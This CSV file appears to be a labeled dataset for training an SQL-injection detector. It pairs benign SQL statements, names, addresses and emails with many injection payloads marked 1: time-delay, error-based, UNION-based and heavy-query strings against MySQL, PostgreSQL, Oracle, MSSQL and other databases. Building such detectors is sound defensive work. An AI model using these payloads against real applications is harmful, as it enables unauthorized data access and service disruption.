Query,Label
mercador,0
1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,1
"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bcxh"" like ""bcxh",1
SELECT * FROM small WHERE silly BETWEEN 'term' AND 'information',0
SELECT * FROM boy WHERE evidence = 'grade',0
"1' where 6963  =  6963 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
mebine,0
"-3626%""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """,1
waring,0
SELECT * FROM frame,0
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx",1
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",1
"1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg",1
"1,  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )",1
"INSERT INTO desk ( hidden, atomic, lift, subject, noon, second )  VALUES  ( 'fed', 'badly'. sure', 'word', 'alive', 'first', 'yesterday' )",0
torreblacos,0
"1""  )   as kuuf where 6908  =  6908",1
"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1
vallclara,0
"SELECT eggID AS ID, national AS pay FROM carry",0
"-2743 union all select 6757,6757,6757,6757,6757,6757--",1
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",1
"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",1
SELECT * FROM  ( SELECT weak FROM breakfast ),0
2isnomo,0
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1
SELECT AVG ( correctly ) FROM usually SELECT SUM ( shoot ),0
SELECT * FROM gun ORDER BY part DESC,0
"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM dinner ORDER BY also DESC,0
select   (  case when   (  7096  =  2568  )   then 7096 else 1/  (  select 0  )   end  )  --,1
narbo_nesa,0
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""htyi""  =  ""htyi",1
1'   )    )    as wdor where 7426  =  7426,1
"SELECT children AS character, leg AS [coach]  FROM some",0
"1""  )   union all select null#",1
DELETE FROM examine,0
"calle rendona 45, 5-a",0
"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,1
"-4926"" where 8152  =  8152 or 4339  =  5547#",1
"SELECT LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0
SELECT AVG ( black ) FROM problem,0
SELECT TOP 50 PERCENT * FROM read SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM beyond,0
"SELECT * FROM yourself WHERE turn NOT IN  ( 'pony', 'degree', 'scared' )",0
desafinar,0
99508422a,0
cegajoso,0
1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1
SELECT * FROM perfect WHERE cloth NOT BETWEEN 'gold' AND 'along',0
wenner@rpdkorea.nr,0
"romana, la",0
DELETE FROM slope,0
-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ),1
4.46658E+15,0
DELETE FROM weight,0
"-6854"" where 7794  =  7794 union all select 7794,7794--",1
SELECT of ( s ) FROM fact INNER JOIN,0
SELECT certainly ( s FROM hurt RIGHT JOIN,0
6e665a,0
SELECT * FROM lucky WHERE young = 'slide'  OR many = 'twelve',0
"1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT slabs ( s FROM alike RIGHT JOIN,0
SELECT tobacco FROM newspaper UNION ALL SELECT numeral FROM stared ORDER BY substance,0
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,1
thordsen@guejos.sy,0
3.99279E+14,0
"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",1
ninn,0
SELECT * FROM men WHERE calm = 'feature',0
2.88508E+14,0
SELECT * FROM garden WHERE mood BETWEEN 'possible' AND 'wood',0
SELECT president FROM any UNION ALL SELECT this FROM sunlight ORDER BY driver,0
SELECT * FROM above WHERE simple = 'research',0
1   )    )    as xzcl where 2332  =  2332,1
-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,1
"INSERT INTO specific  ( did, simplest, happily )  VALUES  ( 'great', 'left', 'above' )",0
"select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",1
wilmont,0
"emilio arrieta, 110, 1f",0
2.96781E+15,0
SELECT AVG ( flower ) FROM five SELECT SUM ( direction ),0
SELECT * FROM boat WHERE service = 'chart'  AND  ( yourself = 'rapidly' OR wide = 'shout' ),0
SELECT * FROM depend  WHERE escape = mice,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28549 )  ORDER BY meta_id ASC",0
-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,1
SELECT * FROM report,0
SELECT * FROM myself WHERE involved BETWEEN 'similar' AND 'luck',0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  '%'  =  '",1
select   (  case when   (  2968  =  2021  )   then 1 else 2968*  (  select 2968 from master..sysdatabases  )   end  )  --,1
mccarthy.darcy@tantomontamontatanto.jo,0
"SELECT glad, saddle, grandmotherFROM various WHERE pet  IS NOT NULL",0
calle capitan palacios 71,0
(  sqlattempt2  ),1
"SELECT * FROM behavior WHERE diagram BETWEEN ""sound"" AND    ""pile""",0
"SELECT fallenID AS ID, certain AS stay FROM supply",0
"SELECT islandID AS ID, aware AS badly FROM farther",0
SELECT COUNT ( DISTINCT visit )  FROM growth,0
SELECT * FROM within ORDER BY get,0
escarpelo,0
3407,0
SELECT steady ( s )  FROM felt LEFT JOIN,0
"SELECT CONV ( 1111, 2, 10 ) ;",0
"1""  )   as boeh where 2571  =  2571 union all select null#",1
SELECT AVG ( consonant ) FROM music SELECT SUM ( dinner ),0
"1   )    )     )   union all select null,null,null,null,null,null#",1
SELECT bottom FROM noted,0
27597488h,0
SELECT * FROM chain,0
SELECT noon ( s FROM came RIGHT JOIN,0
lazlo,0
select   (  case when   (  7385  =  8723  )   then 7385 else 7385*  (  select 7385 from information_schema.character_sets  )   end  )  #,1
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,1
SELECT ACOS ( 0.25 ) ;,0
"SELECT column1 , column2, ... FROM table_name WHERE condition ;",0
"-1634%' union all select 5937,5937,5937,5937--",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""vqpx"" like ""vqpx",1
SELECT * FROM buffalo,0
deltell riberas,0
"-5417 or elt  (  1032  =  1032,3623  )",1
elias pallares,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",1
decio,0
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,0
SELECT * FROM talk WHERE trip = 'stepped'  AND  ( night = 'arrive' OR growth = 'might' ),0
villarrasa,0
SELECT * FROM verb,0
6.05128E+15,0
SELECT * FROM chart WHERE inch BETWEEN never09/01/1996mean AND done15/31/1996noise,0
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
SELECT promised ( s )  FROM itself FULL OUTER JOIN,0
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  #,1
-4900'   )    )    or 7208  =  3236,1
-6144'  )   or 9385  =  2474--,1
"c/ cardenal cisneros 58,",0
sendra rull,0
coxcojita,0
SELECT * FROM report WHERE NOT listen = 'enter'  AND NOT favorite = 'right',0
"select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1
SELECT hearing FROM local UNION SELECT short FROM film ORDER BY show,0
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT taken ( s )  FROM sleep UNION ALL,0
3600,0
SELECT foreign ( s )  FROM expect,0
6.14046E+15,0
"1' where 8437  =  8437 and make_set  (  8403  =  8403,8899  )  --",1
"""  )  ;waitfor delay '0:0:__TIME__'--",1
"SELECT * FROM classroom WHERE simplest NOT IN  ( 'pleasant', 'stems', 'summer' )",0
"1"" where 8483  =  8483 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ggiw'  =  'ggiw",1
-9650'  )   or 1390  =  3209,1
SELECT comfortable FROM zoo UNION SELECT allow FROM life ORDER BY fed,0
heicy,0
cusanelli@wdsl.ao,0
SELECT sure ( s )  FROM decide LEFT JOIN,0
SELECT TOP 3 * FROM met,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",1
"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1467,0
"INSERT INTO nervous ( eye, figure, in, bark, bone, equipment )  VALUES  ( 'itself', 'taken'. similar', 'sent', 'talk', 'worse', 'dangerous' )",0
SELECT wash ( s )  FROM aloud UNION ALL,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",1
"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",1
el taxista 199 10?c,0
"1"" where 2512  =  2512 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
UPDATE smooth SET log = 'in'WHERE top = 'cotton',0
FROM  ( SELECT DISTINCT seen FROM once ),0
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1
"1' in boolean mode  )   union all select null,null,null,null,null--",1
"1""  )   as hhxx where 3372  =  3372 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1
SELECT * FROM be WHERE yourself BETWEEN forest09/01/1996clearly AND similar15/31/1996think,0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,1
narros de matalayegua,0
48825670m,0
18513875w,0
faix,0
hardwick@corjet.gh,0
"1' in boolean mode  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",1
venfica,0
1'||  (  select 'zccb' from dual where 8911  =  8911,1
1   )    )    as ndrh where 6308  =  6308,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'boud'  =  'boud",1
SELECT Count ( * )  AS growth,0
"INSERT INTO driven ( your, country, welcome, popular, salt, wherever )  VALUES  ( 'fox', 'community'. bet', 'heavy', 'dog', 'replace', 'sister' )",0
SELECT indeed ( s )  FROM rise LEFT JOIN,0
benasque,0
SELECT * FROM bicycle WHERE ten = 'road',0
"INSERT INTO method ( nice, talk, meet, thought, scientific, just )  VALUES  ( 'curious', 'victory'. principle', 'finish', 'independent', 'built', 'married' )",0
"plaa dels bous, 107",0
"1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",1
"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1
SELECT * FROM prize 3,0
"SELECT track AS be, increase AS [task]  FROM on",0
SELECT * FROM cake  WHERE major = party,0
perr@pasajesaereosbaratos.pm,0
SELECT COUNT ( butID ) FROM film,0
"1%""   )    )     )   and 4595  =  4595#",1
"1""  )   where 2152  =  2152",1
"c/ montereria, 146 4d",0
SELECT AVG ( grain ) FROM nine SELECT SUM ( kids ),0
"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",1
"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",1
savoula,0
kulle@coworkers.tl,0
"SELECT Employees.one, COUNT ( Orders.wolfID )  AS signFROM    ( OrdersINNER JOIN tent ON Orders.exampleID  =  Employees.lastID )",0
SELECT * FROM nest WHERE attack = 'paper',0
1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,1
-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,1
SELECT MIN ( fed )  AS hidden FROM receive,0
ibazeta montells,0
"1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
stefana1,0
tchjan-lian.quadflieg@comerciosdeaspe.se,0
"SELECT Employees.halfway, COUNT ( Orders.laborID )  AS passFROM    ( OrdersINNER JOIN enjoy ON Orders.forgetID  =  Employees.dependID )",0
7.36777E+15,0
arceo feliu,0
"SELECT CONCAT ( Address, "" "", PostalCode, "" "", City )  AS Address FROM  Customers;",0
SELECT complete,0
calle torreta 126 9c,0
"SELECT Orders.yourselfrID, Employees.hit, Employees.birthday FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dutyID ORDER BY Orders.cabinID",0
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ),0
SELECT * FROM crew  WHERE put = problem,0
WHERE ProductID  =  ANY  ( SELECT   ProductID FROM OrderDetails WHERE Quantity  =  10 ) ;,0
SELECT later ( s ) FROM member INNER JOIN,0
SELECT * FROM product WHERE water BETWEEN 'case' AND 'mail',0
"1   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT column_name FROM table_name WHERE ROWNUM < =  number ;,0
joudrey,0
SELECT * FROM rubbed FETCH FIRST 3 ROWS ONLY,0
SELECT major ( s )  FROM fat FULL OUTER JOIN,0
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",1
SELECT * FROM write,0
ramaprak,0
"SELECT ride,protection,beauty,horn,native     (  (  finger JOIN bad ON play.review =  paper.hit )   INNER JOIN spokenON Orders.income =  instant.appliedID )",0
"-4054"" or 2824  =  4788--",1
"SELECT REPEAT ( ""SQL Tutorial"", 0 ) ;",0
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",1
"1%""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1
vicente,0
"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",1
1 where 8889  =  8889,1
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )",1
dolores ibarruri 75,0
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1
SELECT * FROM pool FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM peace,0
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf",1
SELECT held FROM even UNION ALL SELECT fresh FROM similar ORDER BY pound,0
"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",1
"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
r3nci8l5so,0
"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",1
"SELECT Orders.brotherrID, Employees.past, Employees.support FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fenceID ORDER BY Orders.mailID",0
suzuki,0
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and '%'  =  ',1
SELECT * FROM variety WHERE gun = 'appropriate' LIMIT 3,0
"1""   )    )    as xxdm where 4818  =  4818",1
travs elias,0
"el provencio, 6 8f",0
"calle morse, 17",0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  7946  =  7946",1
ananas,0
SELECT farther ( s FROM two RIGHT JOIN,0
SELECT TOP 50 PERCENT * FROM leather SELECT * FROM announced FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM anyone,0
SELECT MIN ( deeply )  AS speak FROM lion,0
"-5379'  )   union all select 4294,4294,4294--",1
2.45E+15,0
DELETE FROM men,0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",1
"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
SELECT * FROM he WHERE jungle BETWEEN 'cup' AND 'could',0
17240,0
kobeski,0
cabarrs zafn,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'clhg'  =  'clhg",1
dowson@sehimaco.eg,0
cojera,0
1   )    )    waitfor delay '0:0:5'--,1
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""%""  =  """,1
select * from information_schema.tables--,1
"alqueria de coca 38,",0
"-4233%""  )   or   (  8459  =  8459  )  *4906 and   (  ""%""  =  """,1
"1""   )    )    as dfwi where 9703  =  9703 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
1'||  (  select 'mobv' from dual where 6338  =  6338,1
1'+  (  select ohqr where 5610  =  5610,1
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'beju' like 'beju",1
SELECT AVG ( oil ) FROM happen,0
"select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1
SELECT DISTINCT positive FROM fallen,0
"SELECT nearby, surrounded, snakeFROM development WHERE hand  IS NOT NULL",0
jung5,0
SELECT * FROM should WHERE Price NOT BETWEEN 10 AND 20,0
SELECT MIN ( power )  AS sum FROM sun,0
"1   )    )    as fwru where 5262  =  5262 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
FROM  ( SELECT DISTINCT save FROM chose ),0
"1""   )    )    as szxa where 1501  =  1501 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""pnsz"" like ""pnsz",1
levert_lightfoot@laschinas.tm,0
"select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1
SELECT Count ( * )  AS properly,0
ayyuce,0
SELECT * FROM ordinary WHERE although  BETWEEN 10 AND 20,0
"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",1
"SELECT age, greatest, drawFROM seldom WHERE full  IS NOT NULL",0
1.1363E+15,0
1' where 3337  =  3337 and 8403  =  5760,1
4562,0
SELECT COUNT ( roomID ) FROM tobacco,0
UPDATE express SET several = 'young'WHERE route = 'paper',0
"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",1
SELECT feathers,0
UPDATE wave SET load = 'speak'WHERE carry = 'probably',0
SELECT COUNT ( carried ) FROM wheat,0
"select * from users where id  =  1 +   (  \.  )   union select null,@@VERSION -- 1",1
"SELECT development,mountain,dirty FROM at LEFT JOIN Orders ON exchange.wonID =  kill.cover ORDER BY between.clothing",0
SELECT * FROM where WHERE add NOT LIKE 'engine%',0
"INSERT INTO thy  ( open, even, stand )  VALUES  ( 'today', 'connected', 'above' )",0
"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",1
-3748' where 9292  =  9292 or 3337  =  2859#,1
SELECT * FROM softly WHERE correctly LIKE '%luck%',0
SELECT TOP 50 PERCENT * FROM atom,0
1%'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk",1
7.81237E+15,0
SELECT * FROM lady ORDER BY positive,0
SELECT not ( s )  FROM greatest UNION,0
wanda,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""dwbh"" like ""dwbh",1
"-8200%""   )    )    union all select 7538,7538,7538#",1
"SELECT * FROM dream WHERE open IN  ( 'student', 'grew', 'shorter' )",0
SELECT * FROM sea WHERE being = 'sugar' FETCH FIRST 3 ROWS ONLY,0
"SELECT region, difference+ ', ' + mighty+ ' ' + ago+ ', ' + brain AS angle  FROM identity",0
SELECT * FROM wing WHERE weigh BETWEEN 'bit' AND 'while',0
SELECT * FROM system 3,0
"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""gozk""  =  ""gozk",1
SELECT * FROM broke WHERE choice = 'touch' LIMIT 3,0
56163821y,0
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",1
juglandea,0
SELECT * FROM heard,0
"INSERT INTO column ( white, does, certain, curious, first, our )  VALUES  ( 'rose', 'anyone'. close', 'remove', 'force', 'feet', 'fell' )",0
rosi10,0
charley,0
"1  )   where 9724  =  9724 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",1
SELECT child FROM hurt,0
SELECT saved FROM coffee UNION ALL SELECT energy FROM closely ORDER BY consist,0
SELECT * FROM fine,0
SELECT AVG ( loud )  FROM chance  SELECT SUM ( mice ),0
valladolid,0
"1,iif  (  7475  =  7475,1,1/0  )",1
SELECT COUNT ( beside )  FROM lungs,0
"-5066'   )    )    union all select 9689,9689,9689,9689#",1
